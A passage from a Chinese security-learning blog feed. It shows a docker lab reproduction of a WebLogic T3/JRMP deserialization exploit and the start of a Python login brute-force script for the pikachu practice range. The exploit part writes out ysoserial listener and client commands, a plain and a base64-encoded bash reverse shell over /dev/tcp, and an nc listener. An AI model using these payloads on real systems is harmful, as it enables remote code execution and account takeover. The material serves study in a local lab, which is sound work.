机制的缺陷，通过 JRMP 协议（Java远程方法协议）达到执行任意反序列化代码，进而造成远程代码执行</p><p>同为WebLogic T3引起的反序列化漏洞还有CVE-2015-4852、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2018-2893、CVE-2016-0638</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h3><p>在InboundMsgAbbrev中resolveProxyClass中，resolveProxyClass是处理rmi接口类型的，只判断了java.rmi.registry.Registry，这就会导致任意一个rmi接口都可绕过。核心部分就是JRMP（Java Remote Method protocol），在这个PoC中会序列化一个RemoteObjectInvocationHandler，它会利用UnicastRef建立到远端的tcp连接获取RMI registry，加载回来再利用readObject解析，从而造成反序列化远程代码执行。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h3><p>docker-compose起环境，访问</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718210439993.png" alt="image-20240718210439993"></p><p>这里先使用nmap扫描一下是否开启了WebLogic T3服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n -v -p 7001,7002 192.168.174.137 --script=weblogic-t3-info</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718211002989.png" alt="image-20240718211002989"></p><p>漏洞检测脚本，好多扫不出来，试试以前的旧版本</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718231224408.png" alt="image-20240718231224408"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718212511966.png" alt="image-20240718212511966"></p><p>要专门这个探测工具才行。。但教程很多都是用旧版的ysoserial-0.1-cve-2018-2628-all，我试试新版的工具怎么用</p><p><a href="https://blog.csdn.net/st3pby/article/details/135111050">https://blog.csdn.net/st3pby/article/details/135111050</a></p><p>启动JRMP Server（下面这个是练习）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 192.168.174.160 1099 CommonsCollections1 whoami</span><br></pre></td></tr></table></figure><p>反弹shell命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.174.160:9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>base64编码<a href="https://ares-x.com/tools/runtime-exec">https://ares-x.com/tools/runtime-exec</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>开启JMRP Server服务：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>本地监听9999端口：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure><p>这个payload还有点难生成xxd装不上记得更新下源</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar JRMPClient 192.168.174.160:7777 | xxd -p | tr -d $&#x27;\n&#x27; &amp;&amp; echo #JRMP监听的端口</span><br></pre></td></tr></table></figure><p>和之前的比，payload没有2了是JRMPClient</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718234851924.png" alt="image-20240718234851924"></p><p>替换payload</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718234930633.png" alt="image-20240718234930633"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718234944773.png" alt="image-20240718234944773"></p><p>半天没弹回来，保留一下，用别的方法测测</p><p>在攻击机设置好JRM服务,这里执行touch命令时，注意路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;touch /mytest.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719000106128.png" alt="image-20240719000106128"></p><p>打开weblogictool，如图设置好参数</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719000143387.png" alt="image-20240719000143387"></p><p>执行后，在docker容器里查看,yml文件在哪就在哪执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose exec weblogic /bin/bash</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719000226949.png" alt="image-20240719000226949"></p><p>成功执行，那回到第一种方法，利用payload，重新走一遍</p><p>开启JMRP Server服务：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMzcvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719090315802.png" alt="image-20240719090315802"></p><p>更新payload,windows下没有环境，在linux中执行,前面好像执行错了，这里客户端的ip是靶机的ip</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo java -jar ysoserial-all.jar JRMPClient 192.168.174.137:7777 | xxd -p | tr -d $&#x27;\n&#x27; &amp;&amp; echo</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719091031289.png" alt="image-20240719091031289"></p><p>更换payload</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719090714180.png" alt="image-20240719090714180"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719091109057.png" alt="image-20240719091109057"></p><p>使用 nc 进行监听本地的9999端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719091155144.png" alt="image-20240719091155144"></p><p>执行poc还是不行，但后面在在kali测试好像就行了，python脚本执行完要过一会才有反弹回来。。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719101534297.png" alt="image-20240719101534297"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719101931805.png" alt="image-20240719101931805"></p><p>前面也弹回来了，是我没注意。。。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719102247152.png" alt="image-20240719102247152"></p>]]></content>
      
      
      
        <tags>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简易爆破poc</title>
      <link href="/2024/07/21/%E7%AE%80%E6%98%93%E7%88%86%E7%A0%B4poc/"/>
      <url>/2024/07/21/%E7%AE%80%E6%98%93%E7%88%86%E7%A0%B4poc/</url>
      
        <content type="html"><![CDATA[<h1 id="POC学习"><a href="#POC学习" class="headerlink" title="POC学习"></a>POC学习</h1><p>​POC测试，即Proof of Concept，是业界流行的针对客户具体应用的验证性测试，根据用户对采用系统提出的性能要求和扩展需求的指标，在选用服务器上进行真实数据的运行，对承载用户数据量和运行时间进行实际测算，并根据用户未来业务扩展的需求加大数据量以验证系统和平台的承载能力和性能变化。<br>​今天，王哥演示了一下一个爆破脚本编写，也就是写了个poc来验证是复测弱口令漏洞</p><p>​这里对上课学的东西做一下复盘，写一个结合自己理解的POC，可以参考很多例子，但还是写一个自己思路的把</p><p><a href="https://cloud.tencent.com/developer/article/1759225">https://cloud.tencent.com/developer/article/1759225</a></p><h2 id="基于pikachu弱口令爆破的脚本"><a href="#基于pikachu弱口令爆破的脚本" class="headerlink" title="基于pikachu弱口令爆破的脚本"></a>基于pikachu弱口令爆破的脚本</h2><p>​在用xray扫pikachu靶场时，我们会遇到暴力破解的漏洞，这时候我们可以写一个简单的爆破脚本来测试，虽然burp很好用，但写一个poc练习一下也挺好的，写一下需求思维导图，流程图</p><p>​爆破，顾名思义，简单粗暴，对账号，密码用字典一个一个匹配测试，思路比较简单，但实际情况很复杂，有验证码，流量限制等。我们需要考虑这些问题。下面给出一个需求的思维导图。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719211510589.png" alt="image-20240719211510589"></p><p>需求要点多，一步一步来吧，像上课一样，先获取页面，传参，交互，慢慢添加功能，再画一个功能的流程图</p><p>![一个爆破账号密码的python工具流程图 (1)](C:\Users\yxz\Downloads\一个爆破账号密码的python工具流程图 (1).png)</p><p>上面是ai生成的，好细致，还学了两个点，输出日志和结果，这是我没考虑到的。下面先针对pikachu的爆破页面进行编写</p><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>操作系统：windows10</p><p>运行环境：python 3.9.12，pycharm</p><p>主要依赖：在requirement.txt里</p><h2 id="访问页面"><a href="#访问页面" class="headerlink" title="访问页面"></a>访问页面</h2><p>先具体看下页面内容，爬虫后续再实现</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240720095556210.png" alt="image-20240720095556210"></p><p>查看源码</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240720095708441.png" alt="image-20240720095708441"></p><p>post方法，这样子参数不好确定，抓包看看</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240720095839240.png" alt="image-20240720095839240"></p><p>可以，确定参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=admin&amp;submit=Login</span><br></pre></td></tr></table></figure><h2 id="获取页面"><a href="#获取页面" class="headerlink" title="获取页面"></a>获取页面</h2><p>这个可以用requests模块，不会用就搜怎么用</p><p><a href="https://blog.csdn.net/m0_43404934/article/details/122331463">https://blog.csdn.net/m0_43404934/article/details/122331463</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line">r = requests.post(url)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240720103304336.png" alt="image-20240720103304336"></p><h2 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=admin&amp;submit=Login</span><br></pre></td></tr></table></figure><p>传递参数，requests要求参数要写成key-value的格式，也可以是json的格式，这里我们用字典的形式传参，这里先写个正确的密码，看返回内容会不会改变</p><p>传回来的内容，有点难看，看下给它保存成html文件试试</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> ( <span class="string">r&#x27;HTML.html&#x27;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(r.text)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240720104937870.png" alt="image-20240720104937870"></p><p>返回成功的标志是success</p><h2 id="判断是否成功"><a href="#判断是否成功" class="headerlink" title="判断是否成功"></a>判断是否成功</h2><p>可以先用简单if in来试试，简单